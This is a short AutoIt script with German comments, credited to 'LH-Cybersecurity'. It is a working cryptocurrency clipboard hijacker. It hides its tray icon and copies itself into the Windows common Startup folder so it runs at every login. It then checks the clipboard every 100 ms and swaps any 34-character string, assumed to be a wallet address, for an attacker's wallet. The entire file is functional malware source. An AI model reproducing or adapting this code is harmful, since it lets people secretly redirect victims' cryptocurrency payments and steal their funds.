;Autor: LH-Cybersecurity

#NoTrayIcon ;versteckt icon

Global $wielang = "34" ;l�nge der Adresse
Global $wallet = "DeineWalletx45323dl23l123ls1231" ;Wallet auf die die Orginal Wallet ge�ndert werden soll

FileCopy(@ScriptFullPath,@StartupCommonDir);Kopiert Programm in Autostart

While 1
$clip=ClipGet(); Zwischenablage auslesen
ConsoleWrite($clip)

$lang=StringLen($clip); L�nge der Zwischenablage auslesen
ConsoleWrite($wielang)

if $lang==$wielang then ClipPut($wallet); wenn Zwischenablage eine Adresse ist wird sie ge�ndert.
Sleep(100);Ressoursen schonend
WEnd